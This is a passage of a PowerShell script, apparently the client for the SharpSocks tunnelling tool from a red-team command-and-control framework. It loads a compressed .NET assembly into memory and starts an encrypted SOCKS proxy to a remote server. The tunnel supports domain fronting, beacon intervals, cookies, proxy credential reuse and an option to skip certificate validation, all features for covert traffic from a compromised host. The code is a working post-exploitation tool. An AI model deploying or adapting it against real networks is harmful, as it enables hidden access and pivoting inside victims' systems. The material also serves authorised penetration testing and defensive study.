                        break;
                    }
                    $output.Write($buffer, 0, $read)
                }
            }
            finally 
            {
                Write-Verbose "Closing streams and newly decompressed file"
                $gzipStream.Close();
                $output.Close();
                $gzdll.Close();
            }
            $assembly = [System.Reflection.Assembly]::Load($output.ToArray())
            echo "[+] Client Assembly Loaded"
        }

        if($Insecure.IsPresent) {
            $InsecureSSL=$true
        } else {
            $InsecureSSL=$false
        }

        if (([System.Net.ServicePointManager]::ServerCertificateValidationCallback) -and ($InsecureSSL)) {
            $InsecureSSL=$false
        }

        if (!$Key) {
        $Key = Create-AesKey
        }

        $secureStringPwd = $Key | ConvertTo-SecureString -AsPlainText -Force 

        #If there is no channel set
        if (!$Channel) {
        $Channel = Get-RandomChamnnel -Length 25
        }

        # Proxy Config
        if ($ProxyURL) {
            $Proxy = New-Object System.Net.WebProxy($ProxyURL,$True); 

            if ($ProxyUser -and $ProxyPassword) {
                $creds = new-object System.Net.NetworkCredential
                $creds.UserName = $ProxyUser
                $creds.Domain = $ProxyDomain
                $creds.SecurePassword = ConvertTo-SecureString $ProxyPassword -AsPlainText -Force; 
                $Proxy.Credentials = $Creds;
            } else { 
                $Proxy.UseDefaultCredentials = $True;
            } 
        } else {
            $Proxy = [System.Net.WebRequest]::GetSystemWebProxy()
            $Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials
        }

        # New Uri
        $Uri = [System.Uri]$Uri

        # Add URLs
        $NewURLs = New-Object "System.Collections.Generic.List[String]"
        foreach ($URL in $URLs) {
        $NewURLs.Add($URL)
        }

        if ($Client.IsPresent){
            $Script:Comms = New-Object SocksProxy.Classes.Integration.PoshDefaultImplantComms
            $Script:Socks = [SocksProxy.Classes.Integration.PoshCreateProxy]::CreateSocksController($Uri, $Channel, $DomainFrontURL, $UserAgent, $secureStringPwd, $NewURLs, $Cookie1, $Cookie2, $Proxy, $Beacon, $Comms, $InsecureSSL);
            $Script:BoolStart = $Socks.Start()
            if ($BoolStart) {
                echo "" 
                echo "[+] SharpSocks client Started!"
                echo ""
                echo "URLs:"
                foreach ($URL in $URLs) {
                echo "$($Uri)$($URL)"
                }
                echo "Channel: $Channel"
                echo "Key being used: $Key"
                echo "Beacon: $Beacon"
                echo "Cookies: $Cookie1 $Cookie2"
                echo "User-Agent: $UserAgent"
                echo ""
                echo "" 
                echo "[-] Run StopSocks to stop the client!"
                echo ""
            }
        }
    }

}

function StopSocks {
    if ($BoolStart) {
        $Socks.Stop()
        $Socks.HARDStop()
        $Script:Socks.Stop()
        $Script:Socks.HARDStop()
        $Script:BoolStart = $Socks.Stop()
        $Script:BoolStart = $Socks.HARDStop()
        echo "" 
        echo "[-] SharpSocks stopped!"
        echo ""
    } else {
        echo "" 
        echo "[-] SharpSocks not running!"
        echo ""
    }
}

# creates a randon AES symetric encryption key
function Create-AesManagedObject 
{
    param
    (
        [Object]
        $key,
        [Object]
        $IV
    )

    $aesManaged = New-Object -TypeName 'System.Security.Cryptography.RijndaelManaged'
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) 
    {
        if ($IV.getType().Name -eq 'String') 
        {$aesManaged.IV = [System.Convert]::FromBase64String($IV)}
        else 
        {$aesManaged.IV = $IV}
    }
    if ($key) 
    {
        if ($key.getType().Name -eq 'String') 
        {$aesManaged.Key = [System.Convert]::FromBase64String($key)}
        else 
        {$aesManaged.Key = $key}
    }
    $aesManaged
}

# creates a randon AES symetric encryption key
function Create-AesKey() 
{
    $aesManaged = Create-AesManagedObject
    $aesManaged.GenerateKey()
    [System.Convert]::ToBase64String($aesManaged.Key)
}

function Get-RandomChamnnel 
{
    param ([int]$Length)
    $set    = 'abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray()
    $result = ''
    for ($x = 0; $x -lt $Length; $x++) 
    {
        $result += $set | Get-Random
    }
    return $result
}